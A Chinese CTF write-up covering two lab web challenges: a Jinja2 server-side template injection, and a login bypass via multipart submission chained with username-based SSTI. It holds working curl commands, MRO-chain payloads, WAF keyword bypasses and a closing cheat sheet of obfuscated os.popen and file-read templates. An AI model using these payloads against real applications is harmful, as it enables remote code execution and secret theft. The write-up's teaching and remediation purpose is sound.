---
title: '好靶场 — SSTI 模板注入 & real_login 认证绕过 — CTF Writeup'
date: '2026-05-31T00:00:00Z'
modifiedTime: '2026-05-31T00:00:00Z'
intro: '访问目标，页面标题 `RENDER // ENGINE`，是一个"仪表盘模板预览"微服务。页面包含两个视图：'
tags: ['ctf', 'writeup', 'sql注入', 'ssti', 'rce', 'python', '命令注入', '序列化']
cover: ''
---
# 好靶场 — SSTI 模板注入 & real_login 认证绕过 — CTF Writeup

## 题目信息

| 字段 | 题目一 | 题目二 |
|------|--------|--------|
| **题目名称** | 仪表盘模板预览（SSTI） | real_login? |
| **题目类型** | Web — Server-Side Template Injection | Web — 认证绕过 + SSTI + WAF Bypass |
| **技术栈** | Flask + Jinja2 + gunicorn | Flask/Werkzeug 3.0.6 + Python 3.8.20 |
| **目标** | `qx4nweu.haobachang1.loveli.com.cn:8888` | `xgkyb7p.haobachang1.loveli.com.cn:8888` |
| **Flag** | `/tmp/flag.txt` | `/tmp/flag.txt` |

---

## 题目一：仪表盘模板预览（SSTI）

### 一、信息收集

访问目标，页面标题 `RENDER // ENGINE`，是一个"仪表盘模板预览"微服务。页面包含两个视图：

- **Dashboard**：系统指标展示（Requests、Load）
- **Editor**：Jinja2 模板编辑器，带 `Generate Preview` 按钮

响应头暴露技术栈：

```
Server: gunicorn
```

编辑器默认模板内容：

```jinja2
Hello 172.18.0.2!
Current User: production
```

### 二、SSTI 验证

前端 JS 分析揭示 API 流程：

1. `POST /api/auth/login` → 获取 token
2. `POST /api/template/preview` + `X-Access-Token` header + `{"template": "..."}` → 渲染模板

```bash
# 获取 token
TOKEN=$(curl -s -X POST "http://TARGET:8888/api/auth/login" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# SSTI 验证：{{7*7}} → 49
curl -s -X POST "http://TARGET:8888/api/template/preview" \
  -H "X-Access-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template": "{{7*7}}"}'
# {"preview":"49","status":"rendered"}  ✅ SSTI 确认
```

### 三、RCE — MRO 链读取 Flag

利用 Python MRO（Method Resolution Order）链访问 `__builtins__` 内置函数：

```
().__class__.__mro__[1].__subclasses__()[133].__init__.__globals__["__builtins__"]["open"]("/tmp/flag.txt").read()
```

Jinja2 管道写法：

```bash
curl -s -X POST "http://TARGET:8888/api/template/preview" \
  -H "X-Access-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template": "{{()|attr(\"__class__\")|attr(\"__mro__\")|attr(\"__getitem__\")(1)|attr(\"__subclasses__\")()|attr(\"__getitem__\")(133)|attr(\"__init__\")|attr(\"__globals__\")|attr(\"__getitem__\")(\"__builtins__\")|attr(\"__getitem__\")(\"open\")(\"/tmp/flag.txt\")|attr(\"read\")()}}"}'
```

```json
{"preview":"flag{2bdf9372e9774f5dbe0ce8c976a8b184}\n","status":"rendered"}
```

### Flag 1

```
flag{2bdf9372e9774f5dbe0ce8c976a8b184}
```

### 四、修复建议

- 使用 `jinja2.sandbox.SandboxedEnvironment` 限制模板可访问对象
- 禁止用户输入作为模板代码执行，仅允许传入数据变量
- 若必须支持模板，白名单校验 `__class__`、`__mro__`、`__subclasses__` 等危险属性

---

## 题目二：real_login?

### 一、信息收集

访问目标，`302` 重定向到 `/login`，页面标题 `CTF Login`，系统名 `SDPCSEC Login System`。

响应头暴露技术栈：

```
Server: Werkzeug/3.0.6 Python/3.8.20
```

功能路由：

| 路由 | 方法 | 功能 |
|------|------|------|
| `/login` | GET/POST | 登录 |
| `/register` | GET/POST | 注册 |
| `/dashboard` | GET | 用户面板（需认证） |
| `/logout` | GET | 登出 |

Session cookie 格式为 `itsdangerous.URLSafeTimedSerializer`：

```
session=eyJ1c2VybmFtZSI6ImF0dGFja2VyNDU2In0.ahvZyg.cWy1kLa9T5KpcCyJRwWIfVwOqz0
# base64({"username":"attacker456"}).timestamp.hmac_signature
```

### 二、认证绕过 — multipart/form-data

常规 `application/x-www-form-urlencoded` 方式登录 `admin/admin` 返回 200（失败），但使用 `multipart/form-data` 提交相同凭证却成功：

```bash
# URL-encoded: 失败
curl -X POST "http://TARGET:8888/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin"
# → 200 OK (登录失败)

# Multipart: 成功！
curl -X POST "http://TARGET:8888/login" \
  -F "username=admin" \
  -F "password=admin"
# → 302 Found → /dashboard (Set-Cookie: session=...)
```

**验证**：multipart 方式仅对正确密码生效（`admin/wrong` 仍失败），说明密码校验逻辑本身正确，但 URL-encoded 路径存在某种拦截或异常行为。

### 三、SSTI 发现 — 注册用户名注入

注册用户名 `{{config}}` 后登录，Dashboard 渲染 `Welcome back, <Config {...}>!` — **用户名被 Jinja2 模板引擎渲染**。

通过 `{{config}}` 泄露完整 Flask 配置，提取 SECRET_KEY：

```
SECRET_KEY: ctf_secret_key_2024
```

### 四、WAF 过滤规则分析

SSTI payload 存在关键词 WAF，测试确认过滤规则：

**被拦截的关键词**（作为连续子串检测）：

| 关键词 | 说明 |
|--------|------|
| `__` | 双下划线 |
| `class` | Python 类属性 |
| `globals` | 全局变量 |
| `builtins` | 内置函数（部分上下文） |
| `subclasses` | 子类枚举 |
| `init` | 构造函数 |
| `os` | 操作系统模块 |
| `popen` / `system` | 命令执行 |
| `request` | Flask 请求对象 |
| `SECRET_KEY` | 配置密钥 |
| `eval` / `exec` | 代码执行 |
| `flag` | Flag 关键词（包括字符拆分后检测 f→l→a→g 顺序） |
| `items` / `get` / `keys` / `listdir` | 字典/列表方法 |
| `format` / `join` / `replace` | 字符串方法 |

**特殊检测**：`flag` 不仅检测连续子串，还检测 `f"~"l"~"a"~"g"` 拆分拼接模式。但 `{{"c"~"l"~"a"~"s"~"s"}}` 可绕过 `class` 过滤。

**可用绕过手段**：

| 技巧 | 示例 | 效果 |
|------|------|------|
| `~` 拼接 | `"o"~"s"` | 绕过连续关键词检测 |
| `|attr()` 代替 `.` | `obj|attr("name")` | 绕过 `.keyword(` 模式检测 |
| `[]` 字典访问 | `dict["key"]` | 绕过 `.attr` 模式 |
| `+` 字符串拼接 | `"f"+"l"+"a"+"g"` | 绕过 `~` 模式检测（单次可用） |
| Shell 通配符 | `cat /tmp/f*` | 绕过 `flag` 关键词检测 |

### 五、SSTI RCE — 逐步构造

**Step 1：访问 `os` 模块**

```jinja2
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]}}
# → <module 'os' from '/usr/local/lib/python3.8/os.py'>
```

**Step 2：`os.popen` + `|attr` 执行命令**

```jinja2
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]|attr("p"~"o"~"p"~"e"~"n")("i"~"d")|attr("r"~"e"~"a"~"d")()}}
# → uid=0(root) gid=0(root) groups=0(root)
```

**Step 3：通配符绕过 `flag` 过滤**

直接使用 `/tmp/flag.txt` 或其任何拆分形式均被拦截。关键突破：**Shell 通配符 `f*` 不触发 `flag` 关键词检测**。

```jinja2
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]|attr("p"~"o"~"p"~"e"~"n")("c"~"a"~"t"~" "~"/"~"t"~"m"~"p"~"/"~"f"~"*")|attr("r"~"e"~"a"~"d")()}}
# → flag{10876ceb24474484b5aab9aea0ee8e6f}
```

**完整 Payload 注册流程**：

```python
# 注册包含 SSTI payload 的用户名（multipart 绕过）
boundary = "----X"
body = f"""------X\r
Content-Disposition: form-data; name="username"\r
\r
{{payload}}\r
------X\r
Content-Disposition: form-data; name="password"\r
\r
sstipass\r
------X--\r
"""
# POST /register → POST /login → GET /dashboard
# Welcome back, {flag_content}!
```

### Flag 2

```
flag{10876ceb24474484b5aab9aea0ee8e6f}
```

### 六、修复建议

1. **认证绕过**：统一登录接口的 Content-Type 处理逻辑，确保 multipart 和 urlencoded 走相同的校验路径
2. **SSTI**：用户名等用户输入不应传入 `render_template_string`，应使用 `render_template` + 变量传参
3. **WAF**：关键词黑名单不可靠（`~` 拼接、通配符均可绕过），应从根源消除 SSTI 而非依赖 WAF

---

## 工具与 Payload 速查

### Jinja2 SSTI 绕过 WAF 模板

```
# 访问 os 模块
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]}}

# os.popen(cmd).read() — 用 |attr 代替 . 访问
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]|attr("p"~"o"~"p"~"e"~"n")("CMD")|attr("r"~"e"~"a"~"d")()}}

# os.read(os.open(path, 0), size) — 文件读取
{{(lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]|attr("r"~"e"~"a"~"d")((lipsum|attr("_"~"_"~"g"~"l"~"o"~"b"~"a"~"l"~"s"~"_"~"_"))["o"~"s"]|attr("o"~"p"~"e"~"n")("PATH", 0), 500)}}
```

### WAF 绕过技巧汇总

| 目标 | 被过滤 | 绕过方式 |
|------|--------|----------|
| `__class__` | `__` | `"_"~"_"~"c"~"l"~"a"~"s"~"s"~"_"~"_"` |
| `.popen(` | `popen` + `.` | `\|attr("p"~"o"~"p"~"e"~"n")` |
| `/tmp/flag.txt` | `flag` | Shell 通配符 `cat /tmp/f*` |
| `eval` | `eval` | `["e"~"v"~"a"~"l"]` |
| `request` | `request` | 使用 `lipsum` / `url_for` 等替代全局对象 |
| `dict.items()` | `items` | `\|list` 或 `\|dictsort` |
